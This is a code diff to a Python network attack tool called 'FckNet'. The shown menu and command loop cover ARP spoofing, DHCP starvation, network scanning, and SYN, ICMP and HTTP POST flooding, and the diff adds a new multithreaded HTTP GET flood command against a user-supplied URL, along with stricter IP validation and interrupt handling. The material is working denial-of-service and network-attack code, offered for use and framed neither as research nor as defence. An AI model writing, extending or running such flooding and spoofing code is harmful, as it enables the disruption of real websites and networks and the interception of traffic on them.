@@ -31,6 +31,7 @@ Here's the list of commands for Fcknet:
 - 'syn_flood': Perform SYN Flooding
 - 'icmp_flood': Perform ICMP Flooding
 - 'ddos_post': Perform DDoS POST Request
+- 'ddos_get': Perform DDoS GET Request
 - 'help' or 'h': List all the applicable commands for FckNet
 - 'exit' or 'quit': Terminate FckNet
 """
@@ -62,6 +63,9 @@ def validate_ip(ip):
     :param ip: IP address string
     :return: True if valid, False if invalid
     """
+    if ip.count('.') != 3:
+        logging.error("Invalid IP Format: %s", ip)
+        return False
     try:
         socket.inet_aton(ip)
         return True
@@ -390,6 +394,47 @@ def start_post_flood(url, packet_rate, packet_size, num_threads, duration):
     for thread in threads:
         thread.join()
 
+### DDoS GET ###
+def send_get_requests(target_url, request_rate, duration, stats):
+    """
+    Send GET requests to a target URL to simulate a DDoS attack.
+    :param target_url: The target URL to which GET requests will be sent
+    :param request_rate: The rate (in requests per second) at which to send requests
+    :param duration: The total duration (in seconds) to continue sending requests
+    :param stats: A dictionary to keep track of the number of requests sent
+    """
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        try:
+            response = requests.get(target_url)
+            stats['requests_sent'] += 1
+            if stats['requests_sent'] % 100 == 0:
+                logging.info("Sent %d GET requests to %s", stats['requests_sent'], target_url)
+            time.sleep(1 / request_rate)
+        except requests.RequestException as e:
+            logging.error("Request failed: %s", e)
+            break
+        except KeyboardInterrupt:
+            print("Attack Interrupted.")
+            break
+
+def start_get_flood(target_url, request_rate, num_threads, duration):
+    """
+    Start a DDoS GET attack on the target URL.
+    :param target_url: The target URL to attack
+    :param request_rate: Number of requests to send per second
+    :param num_threads: The number of threads to run concurrently for the attack
+    :param duration: Duration for the attack in seconds
+    """
+    stats = {'requests_sent': 0}
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_get_requests, args=(target_url, request_rate, duration, stats))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+
 def main():
     """
     Main function to handle user inputs and execute the corresponding network attack.
@@ -398,58 +443,69 @@ def main():
     check_if_root()
     print(banner)
     while True:
-        command = input("Fcknet> ").strip().lower()
-        if command == 'exit' or command == 'quit':
-            logging.info("Terminating FckNet...")
-            break
-        elif command == 'help' or command == 'h':
-            print(help_banner)
-        elif command == 'arp_spoof':
-            target_ip = input("Enter target IP for ARP Spoofing: ").strip()
-            spoof_ip = input("Enter spoof IP (usually router's IP): ").strip()
-            if validate_ip(target_ip) and validate_ip(spoof_ip):
-                enable_ip_forwarding()
-                while True:
-                    arp_spoof(target_ip, spoof_ip)
-                    time.sleep(1)
+        try: 
+            command = input("Fcknet> ").strip().lower()
+            if command == '':
+                continue
+            elif command == 'exit' or command == 'quit':
+                logging.info("Terminating FckNet...")
+                break
+            elif command == 'help' or command == 'h':
+                print(help_banner)
+            elif command == 'arp_spoof':
+                target_ip = input("Enter target IP for ARP Spoofing: ").strip()
+                spoof_ip = input("Enter spoof IP (usually router's IP): ").strip()
+                if validate_ip(target_ip) and validate_ip(spoof_ip):
+                    enable_ip_forwarding()
+                    while True:
+                        arp_spoof(target_ip, spoof_ip)
+                        time.sleep(1)
+                else:
+                    logging.error("Invalid IP addresses.")
+            elif command == 'dhcp_starv':
+                interface = input("Enter network interface (e.g., eth0, wlan0): ").strip()
+                send_dhcp_discover(interface)
+            elif command == 'net_scan':
+                ip_range = input("Enter IP range to scan (e.g., 192.168.1.1/24): ").strip()
+                devices = scan_network(ip_range)
+                display_results(devices)
+            elif command == 'syn_flood':
+                target_ip = input("Enter target IP for SYN Flood: ").strip()
+                if not validate_ip(target_ip):
+                    print("Invalid IP address format!")
+                    continue
+                target_port = int(input("Enter target port for SYN Flood: ").strip())
+                packet_rate = int(input("Enter packets per second: ").strip())
+                threads = int(input("Enter number of threads: ").strip())
+                duration = int(input("Enter duration in seconds: ").strip())
+                start_syn_flood(target_ip, target_port, packet_rate, threads, duration)
+            elif command == 'icmp_flood':
+                target_ip = input("Enter target IP for ICMP Flood: ").strip()
+                if not validate_ip(target_ip):
+                    print("Invalid IP address format!")
+                    continue
+                packet_rate = int(input("Enter packets per second: ").strip())
+                num_threads = int(input("Enter number of threads: ").strip())
+                duration = int(input("Enter duration in seconds: ").strip())
+                start_icmp_flood(target_ip, packet_rate, num_threads, duration)
+            elif command == 'ddos_post':
+                url = input("Enter the target URL: ").strip()
+                packet_rate = float(input("Enter packets per second: ").strip())
+                packet_size = int(input("Enter the size of data (bytes) per packet: ").strip())
+                threads = int(input("Enter the number of threads: ").strip())
+                duration = int(input("Enter the duration in seconds: ").strip())
+                start_post_flood(url, packet_rate, packet_size, threads, duration)
+            elif command == 'ddos_get':
+                url = input("Enter the target URL: ").strip()
+                packet_rate = float(input("Enter packets per second: ").strip())
+                threads = int(input("Enter the number of threads: ").strip())
+                duration = int(input("Enter the duration in seconds: ").strip())
+                start_get_flood(url, packet_rate, threads, duration)
             else:
-                logging.error("Invalid IP addresses.")
-        elif command == 'dhcp_starv':
-            interface = input("Enter network interface (e.g., eth0, wlan0): ").strip()
-            send_dhcp_discover(interface)
-        elif command == 'net_scan':
-            ip_range = input("Enter IP range to scan (e.g., 192.168.1.1/24): ").strip()
-            devices = scan_network(ip_range)
-            display_results(devices)
-        elif command == 'syn_flood':
-            target_ip = input("Enter target IP for SYN Flood: ").strip()
-            if not validate_ip(target_ip):
-                print("Invalid IP address format!")
-                continue
-            target_port = int(input("Enter target port for SYN Flood: ").strip())
-            packet_rate = int(input("Enter packets per second: ").strip())
-            threads = int(input("Enter number of threads: ").strip())
-            duration = int(input("Enter duration in seconds: ").strip())
-            start_syn_flood(target_ip, target_port, packet_rate, threads, duration)
-        elif command == 'icmp_flood':
-            target_ip = input("Enter target IP for ICMP Flood: ").strip()
-            if not validate_ip(target_ip):
-                print("Invalid IP address format!")
-                continue
-            packet_rate = int(input("Enter packets per second: ").strip())
-            num_threads = int(input("Enter number of threads: ").strip())
-            duration = int(input("Enter duration in seconds: ").strip())
-            start_icmp_flood(target_ip, packet_rate, num_threads, duration)
-        elif command == 'ddos_post':
-            url = input("Enter the target URL: ").strip()
-            packet_rate = float(input("Enter packets per second: ").strip())
-            packet_size = int(input("Enter the size of data (bytes) per packet: ").strip())
-            threads = int(input("Enter the number of threads: ").strip())
-            duration = int(input("Enter the duration in seconds: ").strip())
-            start_post_flood(url, packet_rate, packet_size, threads, duration)
-        else:
-            logging.warning("Invalid command, type 'help' for options.")
+                logging.warning("Invalid command, type 'help' for options.")
 
+        except KeyboardInterrupt:
+            break
 
 if __name__ == "__main__":
     main()
